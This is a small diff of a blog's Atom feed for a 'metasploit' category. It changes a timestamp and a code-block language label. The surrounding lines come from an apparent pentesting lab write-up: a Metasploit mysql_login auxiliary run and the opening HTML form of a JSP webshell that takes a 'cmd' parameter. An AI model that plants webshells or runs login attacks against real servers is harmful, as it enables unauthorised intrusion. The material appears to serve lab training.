@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-27T16:31:45-05:00</updated>
+  <updated>2016-06-27T16:32:58-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -380,7 +380,7 @@ msf auxiliary(mysql_login) &gt; run
 
 <p>create webshell(from pentester lab, you may generate it using msfvenom)</p>
 
-<p>```php index.jsp
+<p>```jsp  index.jsp
 <FORM METHOD=GET ACTION='index.jsp'>
 <INPUT name='cmd' type=text>
 <INPUT type=submit value='Run'>
